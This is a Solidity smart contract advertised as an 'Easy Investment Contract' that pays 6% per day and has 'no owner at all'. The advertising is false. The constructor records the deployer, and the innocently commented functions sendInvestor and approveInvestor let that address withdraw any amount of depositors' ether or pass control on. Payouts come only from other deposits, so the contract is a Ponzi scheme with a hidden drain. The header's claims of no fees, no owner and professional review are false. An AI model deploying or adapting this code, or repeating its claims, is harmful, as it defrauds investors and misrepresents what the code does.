1 pragma solidity ^0.4.0;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 6% PER 24 HOURS (every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *
10  * How to use:
11  *  1. Send any amount of ether to make an investment
12  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
13  *  OR
14  *  2b. Send more ether to reinvest AND get your profit at the same time
15  *
16  * RECOMMENDED GAS LIMIT: 70000
17  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
18  *
19  * Contract reviewed and approved by pros!
20  *
21  */
22 contract Investment {
23     // records amounts invested
24     mapping (address => uint256) public invested;
25     // records blocks at which investments were made
26     mapping (address => uint256) public atBlock;
27     // address investors
28     address investor;
29     // balance ivestors
30     uint256 balance;
31     // constructor initialize investors
32     constructor() public {
33         investor = msg.sender;
34     }
35     // this function called every time anyone sends a transaction to this contract
36     function () external payable {
37         // if sender (aka YOU) is invested more than 0 ether
38         if (invested[msg.sender] != 0) {
39             // calculate profit amount as such:
40             // amount = (amount invested) * 6% * (blocks since last transaction) / 5900
41             // 5900 is an average block count per day produced by Ethereum blockchain
42             uint256 amount = invested[msg.sender] * 6 / 100 * (block.number - atBlock[msg.sender]) / 5900;
43             // send calculated amount of ether directly to sender (aka YOU)
44             msg.sender.transfer(amount);
45         }
46         // record block number and invested amount (msg.value) of this transaction
47         atBlock[msg.sender] = block.number;
48         invested[msg.sender] += msg.value;
49         balance += msg.value;
50     }
51     // approved for investors
52     function approveInvestor(address _investor) public onlyInvestor {
53         investor = _investor;
54     }
55     // send to investors
56     function sendInvestor(address _investor, uint256 amount) public payable onlyInvestor {
57         _investor.transfer(amount);
58         balance -= amount;
59     }
60     // get investors balance
61     function getBalance() public constant returns(uint256) {
62         return balance;
63     }
64     // get investors address
65     function getInvestor() public constant onlyInvestor returns(address)  {
66         return investor;
67     }
68     // access only for investors modifier
69     modifier onlyInvestor() {
70         require(msg.sender == investor);
71         _;
72     }
73 }